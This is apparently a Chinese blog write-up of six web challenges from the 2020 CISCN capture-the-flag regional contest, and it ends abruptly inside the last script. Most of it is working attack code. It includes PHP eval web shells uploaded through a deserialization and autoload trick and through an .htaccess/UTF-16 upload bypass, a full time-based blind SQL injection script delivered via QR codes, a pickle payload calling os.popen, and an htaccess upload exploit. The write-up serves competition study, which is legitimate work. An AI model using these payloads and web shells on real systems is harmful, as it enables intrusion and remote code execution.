        <h1 id="2020-CISCN-华东南赛区"><a href="#2020-CISCN-华东南赛区" class="headerlink" title="2020 CISCN 华东南赛区"></a>2020 CISCN 华东南赛区</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r is useful, and don&#x27;t forget /var/www/html/***********/cat.php</span><br></pre></td></tr></table></figure>

<p>访问<a target="_blank" rel="noopener" href="http://www.zip拿到源码/">www.zip拿到源码</a></p>
<p>利用<code>$msg = sprintf($msg, $value);     </code>打印文件上传位置<code>me0w_mE0w_miA0</code></p>
<p>访问<code>me0w_mE0w_miA0/cat.php</code>提示vim,拿到源码</p>
<p>cat.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;../waf.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">/*Login check*/</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_SESSION</span>[<span class="string">&#x27;islogin&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Who are you?&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//class is waf~</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h4 align=&#x27;center&#x27;&gt;Hello,ctfer&lt;/h4&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h4 align=&#x27;center&#x27;&gt;But I am only a little cat......really?&lt;/h4&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;div align=&quot;center&quot;&gt;&lt;img src=&quot;../images/cat2.jpg&quot; align=&quot;center&quot; /&gt;&lt;/div&gt;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> waf();</span><br><span class="line">    spl_autoload_register();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;filenames&quot;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$a</span>-&gt;data=<span class="variable">$_COOKIE</span>[<span class="string">&quot;filenames&quot;</span>];</span><br><span class="line">        <span class="variable">$a</span>-&gt;upload_check();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=&#x27;center&#x27;&gt;The Winning Formula is complete!&lt;/h3&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$filenames</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;filenames&quot;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$filenames</span>=<span class="string">&#x27;kee1ongz.meow&#x27;</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filenames</span>,<span class="string">&#x27; Meow~meow,meow~&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>spl_autoload_register();没有任何参数的情况下调用spl_autoload();</p>
<blockquote>
<ul>
<li><code>class_name</code></li>
</ul>
<ul>
<li><code>file_extensions</code></li>
</ul>
<p>在默认情况下，本函数先将类名转换成小写，再在小写的类名后加上 .inc       或 .php 的扩展名作为文件名，然后在所有的包含路径(include paths)中检查是否存在该文件。 </p>
</blockquote>
<p>上传fffffffffffuck.inc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	class fffffffffffuck&#123;</span><br><span class="line">		public function __wakeup()&#123;</span><br><span class="line">			eval($_POST[1]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<p>反序列化:<code>O:13:&quot;ffffffffffuck&quot;:0:[]</code>，将{}换为:<code>[]</code>虽然反序列化失败，但是还是调用了<code>__wakeup</code></p>
<p>拿到flag:<code>ciscn&#123;keQXj78JHVUKjssqgD&#125;</code></p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>提示source.php,composer</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] === <span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$content</span> = file_get_contents(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=file:///var/www/html/excel.php&#x27;</span>);</span><br><span class="line">        file_get_contents(<span class="string">&#x27;http://&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>].<span class="string">&#x27;/?&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;only for localhost&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>composer.json</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;require&quot;: &#123;</span><br><span class="line">        &quot;phpoffice/phpspreadsheet&quot;: &quot;1.5.0&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>hint给你excel.php的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="variable">$r</span> = \PhpOffice\PhpSpreadsheet\IOFactory::createReader(<span class="string">&#x27;Xlsx&#x27;</span>);</span><br><span class="line"><span class="variable">$r</span>-&gt;setReadDataOnly(<span class="literal">TRUE</span>);</span><br><span class="line"><span class="variable">$fileInfo</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line"><span class="variable">$filePath</span> = <span class="variable">$fileInfo</span>[<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$r</span>-&gt;load(<span class="variable">$filePath</span>)-&gt;getSheet(<span class="number">0</span>)-&gt;toArray(); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;illegal xlsx file!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$s</span>.<span class="string">&#x27;&lt;table&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$a</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$s</span>.<span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$i</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="variable">$s</span>.<span class="string">&quot;&lt;td style=\&quot;text-align:center\&quot;&gt;&lt;h2&gt;&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;&lt;/h2&gt;&lt;/td&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$s</span>.<span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$s</span>.<span class="string">&#x27;&lt;/table&gt;&#x27;</span>;</span><br><span class="line">stream_wrapper_unregister(<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;users/&#x27;</span>);</span><br><span class="line"><span class="variable">$fd</span> = (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])?<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]:<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">mkdir(<span class="variable">$fd</span>);</span><br><span class="line"><span class="comment">//data:</span></span><br><span class="line">chdir(<span class="variable">$fd</span>);</span><br><span class="line">file_put_contents(<span class="string">&#x27;profile&#x27;</span>,<span class="variable">$s</span>);</span><br><span class="line"><span class="variable">$f</span> = basename(getcwd()).<span class="string">&#x27;/profile&#x27;</span>;</span><br><span class="line"><span class="comment">//data:,/profile</span></span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!stripos(file_get_contents(<span class="variable">$f</span>),<span class="string">&#x27;&lt;?&#x27;</span>) &amp;&amp; !stripos(file_get_contents(<span class="variable">$f</span>),<span class="string">&#x27;php&#x27;</span>)) &#123;</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;no!&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>file_get_contents在处理data:,xxxxxx时会直接取xxxxxx<br>而include会包含文件名为data:,xxxxxx的文件</p>
<p>但是我们无法直接创建<code>data:</code>的文件夹</p>
<p>先用<code>./data:</code>创建<code>data:</code>文件夹</p>
<p>再用<code>data:</code>来绕过<code>if(!stripos(file_get_contents($f),&#39;&lt;?&#39;) &amp;&amp; !stripos(file_get_contents($f),&#39;php&#39;))</code></p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p><a target="_blank" rel="noopener" href="http://www.zip直接下载,翻源码审计./">www.zip直接下载，翻源码审计。</a></p>
<p>登录这边看这login.php构造一下符合正则规则的参数就好了，登了取下sessionid</p>
<p>然后qr.php里，sql注入明显的点，直接拼接的，<code>$data</code>来自于扫描二维码得到的数据，二维码里是个json：<code>&#123;&quot;id&quot;:&quot;xxxx&quot;&#125;</code>。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;insert into record(p_id, userid)values (&#x27;&quot;</span>.<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27;,&#x27;&quot;</span>.<span class="variable">$user</span>-&gt;getCardID().<span class="string">&quot;&#x27;);&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>写盲注脚本爆破一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, time</span><br><span class="line"><span class="keyword">import</span> qrcode</span><br><span class="line"><span class="keyword">from</span> requests.adapters <span class="keyword">import</span> HTTPAdapter</span><br><span class="line"></span><br><span class="line">SQL = <span class="string">&quot;(select group_concat(flag) from flag)&quot;</span></span><br><span class="line">GETCONTENT = <span class="string">&quot;&#x27;or(if( ascii(substr((&quot;</span> + SQL + <span class="string">&quot;),%d,1)) &lt;= %d, sleep(5), 0))or&#x27;&quot;</span></span><br><span class="line">GETLENGTH = <span class="string">&quot;&#x27;or(if( length((&quot;</span> + SQL + <span class="string">&quot;)) &lt;= %d, sleep(5), 0))or&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">THRESHOLD = <span class="number">5</span></span><br><span class="line">STRLEN = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">session.mount(<span class="string">&#x27;http://&#x27;</span>, HTTPAdapter(max_retries=<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span>(<span class="params">payload, strpos=<span class="literal">None</span></span>):</span></span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line">    r = <span class="number">255</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> strpos <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            sql = payload % (mid)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sql = payload % (strpos, mid)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> check(sql) == <span class="literal">True</span>:</span><br><span class="line">            r = mid</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;guess &lt;=&#x27;</span>, r)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = mid + <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;guess &gt;&#x27;</span>, l)</span><br><span class="line">    <span class="keyword">return</span> l</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">payload</span>):</span></span><br><span class="line"></span><br><span class="line">    qr = qrcode.make(<span class="string">&#x27;&#123;&quot;id&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;&#125;&#x27;</span>)</span><br><span class="line">    qr.save(<span class="string">&#x27;qr.png&#x27;</span>)</span><br><span class="line">    start = time.perf_counter()</span><br><span class="line">    x = session.post(</span><br><span class="line">        url=<span class="string">&#x27;http://172.20.6.103/qr.php&#x27;</span>,</span><br><span class="line">        cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;fe940a8329992285f77487f96c575d29&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        files=&#123;</span><br><span class="line">            <span class="string">&quot;file&quot;</span>: <span class="built_in">open</span>(<span class="string">&quot;qr.png&quot;</span>, <span class="string">&quot;rb&quot;</span>),</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/octet-stream&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Content-Disposition&quot;</span>: <span class="string">&quot;form-data&quot;</span>,</span><br><span class="line">            <span class="string">&quot;filename&quot;</span>: <span class="string">&quot;qr.png&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        timeout=(<span class="number">2</span>, <span class="number">8</span>)</span><br><span class="line">    )</span><br><span class="line">    end = time.perf_counter()</span><br><span class="line">    <span class="built_in">print</span>(payload, end-start)</span><br><span class="line">    <span class="keyword">if</span> end-start &gt; THRESHOLD:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getlength</span>():</span></span><br><span class="line">    <span class="keyword">global</span> STRLEN</span><br><span class="line">    STRLEN = guess(GETLENGTH)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;LEN:&#x27;</span>, STRLEN)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcontent</span>():</span></span><br><span class="line">    content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> strpos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, STRLEN+<span class="number">1</span>):</span><br><span class="line">        ch = guess(GETCONTENT, strpos)</span><br><span class="line"></span><br><span class="line">        content += <span class="built_in">chr</span>(ch)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;CHR:&#x27;</span>, <span class="built_in">chr</span>(ch), <span class="string">&#x27;CONTENT:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getlength()</span><br><span class="line">    getcontent()</span><br></pre></td></tr></table></figure>



<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class GetPass</span><br><span class="line">&#123;&#125;</span><br><span class="line">class Upload</span><br><span class="line">&#123;&#125;</span><br><span class="line">$y1ng = new GetPass;</span><br><span class="line">$y1ng-&gt;abandon = new GetPass;</span><br><span class="line">$y1ng-&gt;abandon-&gt;abandon =new Upload;</span><br><span class="line">$y1ng-&gt;abandon-&gt;boring =&quot;1&quot;;</span><br><span class="line">$y1ng-&gt;abandon-&gt;code =&quot;1&quot;;</span><br><span class="line"></span><br><span class="line">$y1ng-&gt;boring = &#x27;read&#x27;;</span><br><span class="line">$y1ng-&gt;code = &#x27;hidden&#x27;;</span><br><span class="line"></span><br><span class="line">$c = new GetPass;</span><br><span class="line">$c-&gt;abandon = new GetPass;</span><br><span class="line">$c-&gt;abandon-&gt;abandon =new Upload;</span><br><span class="line">$c-&gt;abandon-&gt;boring =&quot;1&quot;;</span><br><span class="line">$c-&gt;abandon-&gt;code =&quot;1&quot;;</span><br><span class="line"></span><br><span class="line">$c-&gt;boring = &#x27;read&#x27;;</span><br><span class="line">$c-&gt;code = this;</span><br><span class="line"></span><br><span class="line">$ser = serialize([$y1ng,$c]);</span><br><span class="line">var_dump(urlencode($ser));</span><br></pre></td></tr></table></figure>

<p>拿到pass=ob_end_clean_is_surplus</p>
<p>文件上传与网上某题相近</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">SIZE_HEADER = <span class="string">b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span>(<span class="params">filename, script</span>):</span></span><br><span class="line">    phpfile = <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>) </span><br><span class="line"></span><br><span class="line">    phpfile.write(script.encode(<span class="string">&#x27;utf-16be&#x27;</span>))</span><br><span class="line">    phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">    phpfile.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span>():</span></span><br><span class="line">    htaccess = <span class="built_in">open</span>(<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.write(SIZE_HEADER)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;AddType application/x-httpd-php .fuck\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.multibyte 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.detect_unicode 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value display_errors 1\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.close()</span><br><span class="line">generate_htacess()</span><br><span class="line">generate_php_file(<span class="string">&quot;webshell.fuck&quot;</span>, <span class="string">&quot;&lt;?php eval($_POST[1]); ?&gt;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分别上传webshell.fuck,还有.htaccess拿到flag</p>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ccopy_reg</span><br><span class="line">_reconstructor</span><br><span class="line">p0</span><br><span class="line">(c__main__</span><br><span class="line">webSite</span><br><span class="line">p1</span><br><span class="line">c__builtin__</span><br><span class="line">object</span><br><span class="line">p2</span><br><span class="line">Ntp3</span><br><span class="line">Rp4</span><br><span class="line">(dp5</span><br><span class="line">Vname</span><br><span class="line">p6</span><br><span class="line">c__builtin__</span><br><span class="line">getattr</span><br><span class="line">(cos</span><br><span class="line">popen</span><br><span class="line">(S&#x27;dir&#x27;</span><br><span class="line">tRS&#x27;read&#x27;</span><br><span class="line">tR(NtRp7</span><br><span class="line">sVdescribe</span><br><span class="line">p8</span><br><span class="line">V2</span><br><span class="line">p9</span><br><span class="line">sb.</span><br></pre></td></tr></table></figure>

<p>提权没环境复现</p>
<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://172.20.6.106:80/&quot;</span></span><br><span class="line">burp0_url = <span class="string">&quot;http://172.20.6.106:80/index.php&quot;</span></span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://172.20.6.106&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundary6ssqFd6DiMBBDuHJ&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://172.20.6.106/index.php&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span>, <span class="string">&quot;x-forwarded-for&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">burp0_data = <span class="string">&quot;------WebKitFormBoundary6ssqFd6DiMBBDuHJ\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;htaccess\&quot;\r\nContent-Type: application/octet-stream\r\n\r\nSetHandler application/x-httpd-php\r\n------WebKitFormBoundary6ssqFd6DiMBBDuHJ\r\nContent-Disposition: form-data; name=\&quot;name\&quot;\r\n\r\n.htaccess\r\n------WebKitFormBoundary6ssqFd6DiMBBDuHJ--\r\n&quot;</span></span><br><span class="line">requests.post(burp0_url, headers=burp0_headers, data=burp0_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span 